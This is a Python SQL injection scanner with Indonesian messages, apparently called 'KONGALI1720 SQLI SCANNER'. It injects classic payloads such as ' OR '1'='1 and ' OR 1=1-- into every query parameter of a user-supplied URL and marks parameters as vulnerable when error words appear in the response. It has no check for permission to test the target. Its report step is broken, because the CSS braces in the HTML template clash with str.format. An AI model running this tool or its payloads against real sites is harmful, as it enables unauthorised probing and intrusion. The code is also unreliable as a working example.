import requests
import urllib.parse
from termcolor import cprint
from datetime import datetime

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>SQLi Scan Report - KONGALI1720</title>
    <style>
        body { font-family: Arial, sans-serif; background: #111; color: #eee; padding: 20px; }
        h1 { color: #00ff99; }
        .vuln { color: red; font-weight: bold; }
        .safe { color: #0f0; }
    </style>
</head>
<body>
    <h1>SQL Injection Report - KONGALI1720</h1>
    <p><strong>Scan Time:</strong> {timestamp}</p>
    <p><strong>Target URL:</strong> {target}</p>
    <h2>Results:</h2>
    <ul>
        {results}
    </ul>
</body>
</html>
"""

def load_payloads():
    return [
        "'", '"', "' OR '1'='1", '" OR "1"="1', "') OR ('1'='1", "--", "#", "' OR 1=1--", '" OR 1=1--'
    ]

def scan_url(url, payloads):
    results = []
    parsed_url = urllib.parse.urlparse(url)
    query_params = urllib.parse.parse_qs(parsed_url.query)

    if not query_params:
        cprint("[!] URL tidak memiliki parameter untuk diuji!", "yellow")
        return results

    for param in query_params:
        original_value = query_params[param][0]
        for payload in payloads:
            test_params = query_params.copy()
            test_params[param] = original_value + payload
            test_query = urllib.parse.urlencode(test_params, doseq=True)
            test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{test_query}"

            try:
                response = requests.get(test_url, timeout=5)
                if any(error in response.text.lower() for error in ["sql", "mysql", "syntax", "query", "error"]):
                    cprint(f"[+] SQLi TERDETEKSI: {test_url}", "red")
                    results.append(f'<li class="vuln">[VULNERABLE] {test_url}</li>')
                    break
            except Exception as e:
                cprint(f"[x] Error mengakses: {test_url}", "magenta")
                continue

    if not results:
        cprint("[✓] Tidak ditemukan SQLi pada parameter yang diuji.", "green")
        results.append('<li class="safe">No SQL Injection vulnerabilities found.</li>')

    return results

def save_report(results, target_url):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    html = HTML_TEMPLATE.format(timestamp=timestamp, target=target_url, results='\n'.join(results))
    with open("report.html", "w") as file:
        file.write(html)
    cprint("[+] Laporan disimpan sebagai report.html", "cyan")

if __name__ == "__main__":
    cprint("=== KONGALI1720 SQLI SCANNER ===", "cyan", attrs=["bold"])
    target = input("Masukkan URL target (dengan parameter): ").strip()
    payloads = load_payloads()
    results = scan_url(target, payloads)
    save_report(results, target)
